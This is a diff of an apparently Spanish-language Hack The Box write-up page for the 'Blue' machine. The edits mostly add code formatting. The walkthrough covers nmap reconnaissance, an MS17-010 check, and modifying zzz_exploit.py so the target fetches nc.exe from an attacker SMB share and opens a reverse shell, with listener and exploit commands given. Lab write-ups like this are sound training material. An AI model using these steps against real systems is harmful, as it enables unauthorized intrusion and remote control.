@@ -83,7 +83,6 @@
                 </ul>
               </nav>
             </div>
-            <div class="navigation-wrapper">
               <div>
                 <nav class="cover-navigatio cover-navigation--primary">
                   <ul class="navigation">
@@ -92,7 +91,6 @@
                   </ul>
                 </nav>
               </div>
-            </div>
             
             <div><nav class="cover-navigation navigation--social">
     <ul class="navigation">
@@ -160,7 +158,7 @@
 <li><a href="#blue">Explotación del Eternal Blue</a></li>
 </ul>
 <h2 id="Reconocimiento">Reconocimiento</h2>
-<p>Primero vamos a hacer el reconocimiento de esta maquina con <strong>Nmap</strong></p>
+<p>Primero vamos a hacer el reconocimiento de esta maquina con <code>Nmap</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- --open -T5 -sS -min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn -oG allPorts 10.10.10.40
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
@@ -196,7 +194,7 @@
 </span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 18.42 seconds
 </span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">89681</span> <span style="color:#f92672">(</span>3.946MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">73592</span> <span style="color:#f92672">(</span>2.944MB<span style="color:#f92672">)</span>
-</span></span></code></pre></div><p>Vemos varios puertos abiertos, ahora vamos a usar los scripts básicos de nmap para sacar mas información de estos puertos</p>
+</span></span></code></pre></div><p>Vemos varios puertos abiertos, ahora vamos a usar los scripts básicos de <code>nmap</code> para sacar mas información de estos puertos</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -sCV -p135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 -oN Targeted 
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.93 scan initiated Thu Oct  5 19:18:16 2023 as: nmap -sCV -p135,139,445,49152,49153,49154,49155,49156,49157 -oN Targeted 10.10.10.40</span>
@@ -238,7 +236,7 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Thu Oct  5 19:19:29 2023 -- 1 IP address (1 host up) scanned in 72.49 seconds</span>
-</span></span></code></pre></div><p>Viendo que el windows es una version antigua podemos probar a ver si es vulnerable al Eternal Blue</p>
+</span></span></code></pre></div><p>Viendo que el windows es una version antigua podemos probar a ver si es vulnerable al <code>Eternal Blue</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 --script smb-vuln-ms17-010
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Host script results:
@@ -260,24 +258,24 @@
 <p>Repositorio &ndash;&gt; <a href="https://github.com/worawit/MS17-010">https://github.com/worawit/MS17-010</a></p>
 <p>Una vez descargado este repositorio vamos a usar el cheker.py para ver si es vulnerable</p>
 <p><img src="/htb/Blue/images/1.png" alt="blue"></p>
-<p>Podemos ver que no nos detecta ninguna pipe, por lo cual no es vulnerable, pero si cambiamos un parámetro en el cheker.py para indicarle el usuario guest</p>
+<p>Podemos ver que no nos detecta ninguna pipe, por lo cual <code>no es vulnerable</code>, pero si cambiamos un parámetro en el cheker.py para indicarle el usuario guest</p>
 <p><img src="/htb/Blue/images/2.png" alt="blue"></p>
 <p>Veremos que si lo volvemos a usar nos detectara varias pipes</p>
 <p><img src="/htb/Blue/images/3.png" alt="blue"></p>
 <h2 id="blue">Explotación del Eternal Blue</h2>
-<p>Si modificamos el zzz_exploit.py para que use el usuario &ldquo;gest&rdquo;</p>
+<p>Si modificamos el zzz_exploit.py para que use el usuario <code>gest</code></p>
 <p><img src="/htb/Blue/images/4.png" alt="blue"></p>
-<p>Y modificamos el codigo, para que nos ejecute el comando que nosotros queremos (uno que lo que hace es descargarse el netcat.exe que vamos a subir a nusatro servicio SMB y ejecutarlo para mandarnos una reverse shell)</p>
+<p>Y modificamos el codigo, para que nos ejecute el comando que nosotros queremos (uno que lo que hace es descargarse el <code>netcat.exe</code> que vamos a subir a nuestro servicio <code>SMB</code> y ejecutarlo para mandarnos una reverse shell)</p>
 <p><img src="/htb/Blue/images/5.png" alt="blue"></p>
-<p>Antes de ejecutar el script, vamos a crearnos un servidor smb en el directorio donde tenemos el nc.exe</p>
+<p>Antes de ejecutar el script, vamos a crearnos un servidor smb en el directorio donde tenemos el <code>nc.exe</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 smbserver.py smbFolder <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span> -smb2support
-</span></span></code></pre></div><p>Finalmente nos ponemos en escucha por el puerto 4444</p>
+</span></span></code></pre></div><p>Finalmente nos ponemos en escucha por el puerto <code>4444</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">4444</span>
 </span></span></code></pre></div><p>Ahora ejecutamos el script zzz_exploit.py</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 zzz_exploit.py 10.10.10.40 samr
 </span></span></code></pre></div><p>El comando se ejecutara:</p>
 <p><img src="/htb/Blue/images/6.png" alt="blue"></p>
-<p>Y nosotros ganaremos acceso como Administrador</p>
+<p>Y nosotros ganaremos acceso como <code>Administrador</code></p>
 <p><img src="/htb/Blue/images/7.png" alt="blue"></p>
 
     </section>
@@ -301,7 +299,7 @@
     
     <div class="read-more-item">
         <span class="read-more-item-dim">Recent</span>
-        <h2 class="post-list__post-title post-title"><a href="/thm/2022/07/jajaajano/" title="link to Jajaajano">Jajaajano</a></h2>
+        <h2 class="post-list__post-title post-title"><a href="/writeups/2022/07/pika-twoo/" title="link to Pika Twoo">Pika Twoo</a></h2>
         <p class="excerpt"></p>
         <div class="post-list__meta">
             <time datetime=" 2022-07-19 07:28:17 &#43;0800" class="post-list__meta--date date">2022-07-19</time>
